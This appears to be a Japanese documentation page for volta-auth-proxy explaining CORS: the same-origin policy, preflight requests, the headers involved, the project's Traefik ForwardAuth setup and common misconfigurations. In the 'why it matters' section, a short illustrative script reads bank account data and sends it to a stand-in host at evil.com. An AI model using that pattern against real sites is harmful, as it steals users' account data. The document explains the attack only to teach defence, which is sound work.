# CORS (Cross-Origin Resource Sharing / オリジン間リソース共有)

## これは何？

Cross-Origin Resource Sharing（CORS）とは、あるドメイン（オリジン）の Web ページが、別のドメインにリクエストを送ることを許可するかどうかを制御する、ブラウザに組み込まれたセキュリティの仕組みです。「オリジン」はプロトコル、ドメイン、ポート番号の組み合わせです。つまり `https://app.example.com` と `https://api.example.com` は、同じベースドメインを共有していても異なるオリジンです。

デフォルトでは、ブラウザは**同一オリジンポリシー**を適用します。ページ上の JavaScript は、そのページを配信したのと同じオリジンにだけリクエストを送れます。CORS は、サーバーが他のオリジンからのリクエストを許可するためのオプトインの仕組みです。

たとえば:

```
  https://app.example.com           https://api.example.com
  +---------------------+          +---------------------+
  |  フロントエンド (React)|          |  バックエンド API     |
  |                     |          |                     |
  |  fetch('/api/data') |--ブロック->  CORS なしだと、       |
  |                     |          |  ブラウザが拒否       |
  |  fetch('/api/data') |--OK----->  CORS ヘッダありなら、  |
  |                     |          |  ブラウザが許可       |
  +---------------------+          +---------------------+
```

ここで重要なのは、CORS は**ブラウザ**が適用するもので、サーバーではないということです。サーバーは何を許可するかをヘッダで伝えるだけです。ブラウザがそのヘッダを読んで、JavaScript コードにレスポンスを見せるかどうかを判断します。

## なぜ重要？

同一オリジンポリシーがなかったら、あなたが訪れるどんな Web サイトでも、あなたがログイン中の銀行やメールなど他のサイトにリクエストを送り、レスポンスを読めてしまいます。Cookie は自動的に送られるので、リクエストは認証済みになります。

同一オリジンポリシーがなかった場合のシナリオを想像してください:

```
  your-bank.com にログインしたまま evil-site.com を訪問

  evil-site.com の JavaScript:
    fetch('https://your-bank.com/api/accounts')
      .then(r => r.json())
      .then(data => {
        // 攻撃者があなたの銀行口座情報を入手
        fetch('https://evil.com/steal', {body: JSON.stringify(data)})
      })
```

同一オリジンポリシーがこれを防ぎます。ブラウザは `evil-site.com` が `your-bank.com` のレスポンスを読もうとしていることを検知し、ブロックします。

CORS は、本当にオリジン間の通信が必要な場合（たとえば、フロントエンドが `app.example.com`、API が `api.example.com` にある場合）に、この制限を制御された方法で緩和するために存在します。

## どう動くの？

### 単純リクエスト

単純なリクエスト（GET、HEAD、または標準的なコンテンツタイプの POST）の場合、ブラウザは `Origin` ヘッダを追加してリクエストを送ります。サーバーは CORS ヘッダを含めて応答します:

```
  ブラウザ                                サーバー
  |                                      |
  |  GET /api/data                       |
  |  Origin: https://app.example.com     |
  |  Cookie: session=abc                 |
  |------------------------------------->|
  |                                      |
  |  200 OK                              |
  |  Access-Control-Allow-Origin:        |
  |    https://app.example.com           |
  |<-------------------------------------|
  |                                      |
  ブラウザ: Origin が一致? → JS にレスポンスを見せる
```

### プリフライトリクエスト

より複雑なリクエスト（PUT、DELETE、または `Authorization` のようなカスタムヘッダ付きのリクエスト）の場合、ブラウザはまず「プリフライト」と呼ばれる OPTIONS リクエストを送って、サーバーに何が許可されているか確認します:

```
  ブラウザ                                サーバー
  |                                      |
  |  OPTIONS /api/data      (プリフライト) |
  |  Origin: https://app.example.com     |
  |  Access-Control-Request-Method: DELETE
  |  Access-Control-Request-Headers:     |
  |    Authorization                     |
  |------------------------------------->|
  |                                      |
  |  204 No Content                      |
  |  Access-Control-Allow-Origin:        |
  |    https://app.example.com           |
  |  Access-Control-Allow-Methods:       |
  |    GET, POST, DELETE                 |
  |  Access-Control-Allow-Headers:       |
  |    Authorization, Content-Type       |
  |  Access-Control-Max-Age: 3600        |
  |<-------------------------------------|
  |                                      |
  ブラウザ: プリフライト OK、本番リクエストを送信。
  |                                      |
  |  DELETE /api/data                    |
  |  Origin: https://app.example.com     |
  |  Authorization: Bearer token123      |
  |------------------------------------->|
  |                                      |
  |  200 OK                              |
  |  Access-Control-Allow-Origin:        |
  |    https://app.example.com           |
  |<-------------------------------------|
```

### 主な CORS ヘッダ

| ヘッダ | 送信元 | 目的 |
|--------|--------|------|
| `Origin` | ブラウザ | リクエストの出所をサーバーに伝える |
| `Access-Control-Allow-Origin` | サーバー | どのオリジンを許可するか（`*` で全て） |
| `Access-Control-Allow-Methods` | サーバー | どの HTTP メソッドを許可するか |
| `Access-Control-Allow-Headers` | サーバー | どのカスタムヘッダを許可するか |
| `Access-Control-Allow-Credentials` | サーバー | Cookie や認証ヘッダを許可するか |
| `Access-Control-Max-Age` | サーバー | プリフライト結果をキャッシュする時間 |

## volta-auth-proxy ではどう使っている？

volta-auth-proxy は主に Traefik のようなリバースプロキシの背後で ForwardAuth エンドポイントとして動作します。このアーキテクチャでは、CORS の考慮事項は特殊です:

**ForwardAuth パターンは CORS の問題のほとんどを回避します。** Traefik が volta と下流のアプリケーションの両方の前に立つため、ブラウザからのリクエストは単一のオリジン（Traefik のドメイン）に向かいます。認証チェック（`/auth/verify`）は Traefik と volta の間のサーバー間通信で行われるため、ブラウザが volta に直接クロスオリジンリクエストを送ることはありません。

```
  ブラウザ               Traefik               volta-auth-proxy
  +--------+            +---------+            +----------------+
  |        | app.example |         | /auth/verify               |
  |        | への        |         |----------->|               |
  |        | リクエスト   |         |<-----------|               |
  |        |------------>|         | 200 + X-Volta ヘッダ       |
  |        |<------------|         |            |               |
  |        | アプリからの  | アプリに  |            |               |
  +--------+ レスポンス   | プロキシ  |            +----------------+
                         +---------+

  ブラウザから見ると、クロスオリジンリクエストではない。
  全てが同じオリジンの Traefik を通る。
```

**API エンドポイント。** volta の `/api/v1/*` エンドポイントに直接アクセスする場合（たとえば、SPA が AJAX 呼び出しを行う場合）、CORS ヘッダが必要になることがあります。volta の許可リダイレクトドメイン設定（`ALLOWED_REDIRECT_DOMAINS`）が、信頼するドメインを制御します。

**`/auth/refresh` エンドポイント。** volta-sdk-js（ブラウザ用 SDK）は JWT を更新するためにこのエンドポイントを呼び出します。SDK が volta と異なるオリジンで動作する場合、そのオリジンからの認証情報（Cookie）を許可するように CORS を設定する必要があります。

volta のアプローチは、可能な限り全てを同一オリジンに保つこと（リバースプロキシを通じて）で、クロスオリジンが避けられない場合は許可ドメインリストに対して明示的にオリジンを検証することです。

## よくある間違い

**1. 認証情報ありで `Access-Control-Allow-Origin: *` を設定する。**
ワイルドカード `*` は「どのオリジンでもアクセスできる」という意味です。しかし、ブラウザはワイルドカード CORS では Cookie を送信しません。Cookie（volta のセッション Cookie のような）が必要な場合は、正確なオリジンを指定する必要があります。`*` と `Access-Control-Allow-Credentials: true` の組み合わせは仕様で明示的に禁止されています。

**2. 検証なしで `Origin` ヘッダをそのまま返す。**
一部の開発者は、リクエストが送ってきた `Origin` をそのまま `Access-Control-Allow-Origin` に設定します。これは実質的に `*` と同じですが、認証情報と組み合わせられるのでもっと悪いです。常にホワイトリストに対してオリジンを検証しましょう。

**3. プリフライトリクエストを忘れる。**
サーバーが OPTIONS リクエストを処理しないと、プリフライトリクエストが失敗し、ブラウザが実際のリクエストをブロックします。多くの開発者は単純な GET リクエストだけでテストして、これを見逃します。

**4. CORS がサーバーサイドのセキュリティだと思い込む。**
CORS はブラウザが適用するポリシーです。curl コマンド、モバイルアプリ、別のサーバーは CORS を完全に無視できます。CORS はユーザーのブラウザが攻撃の踏み台として使われることを防ぎます。サーバーサイドの認証・認可の代わりにはなりません。

**5. 許可オリジンが広すぎる。**
`https://*.example.com` は便利に見えますが、もしどこかのサブドメインが侵害されたり、ユーザー生成コンテンツを実行していたりすると、そこからあなたの API に認証済みリクエストを送れてしまいます。

**6. `Access-Control-Max-Age` を設定しない。**
キャッシュがないと、ブラウザは毎回の実際のリクエストの前にプリフライト OPTIONS リクエストを送ります。これで HTTP リクエストの数が 2 倍になります。プリフライト結果をキャッシュするために、適切な max-age（3600 秒など）を設定しましょう。
